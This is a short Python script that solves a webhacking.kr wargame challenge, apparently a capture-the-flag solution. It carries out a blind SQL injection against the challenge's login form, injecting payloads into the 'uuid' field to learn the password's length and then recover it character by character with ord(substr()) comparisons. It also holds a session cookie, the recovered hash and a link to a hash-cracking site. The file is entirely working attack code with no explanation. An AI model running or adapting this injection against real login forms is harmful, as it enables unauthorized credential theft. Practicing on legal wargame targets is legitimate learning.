import requests 
# https://hashes.com/en/decrypt/hash

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) \AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117'}
cookies = {'PHPSESSID':'1plfje78cfg4142vhfrt3l4lon'}

def HttpRequest():
    length = 0
    url = "https://webhacking.kr/challenge/bonus-2/index.php"
    for i in range(50):
        data = {'uuid':"admin\' and if(length(pw)like({}),1,0)#".format(i), 'pw':'admin'}
        res = requests.post(url, headers=headers, cookies=cookies, data=data) 
        if res.text.find("Wrong") > 0: 
            length = i 
    
    print("Password Length: {}".format(length))

    password = "" # 6c9ca386a903921d7fa230ffa0ffc153
    for i in range(length + 1): 
        for key in range(48, 128):
            data = {'uuid':"admin\' and if(ord(substr(pw,{},1))like({}),1,0)#".format(i,key), 'pw':'admin'}
            res = requests.post(url, headers=headers, cookies=cookies, data=data) 
            if res.text.find("Wrong") > 0:

                password += chr(key) 
                break 

    print("Password: {}".format(password))

if __name__ == '__main__': 
    HttpRequest()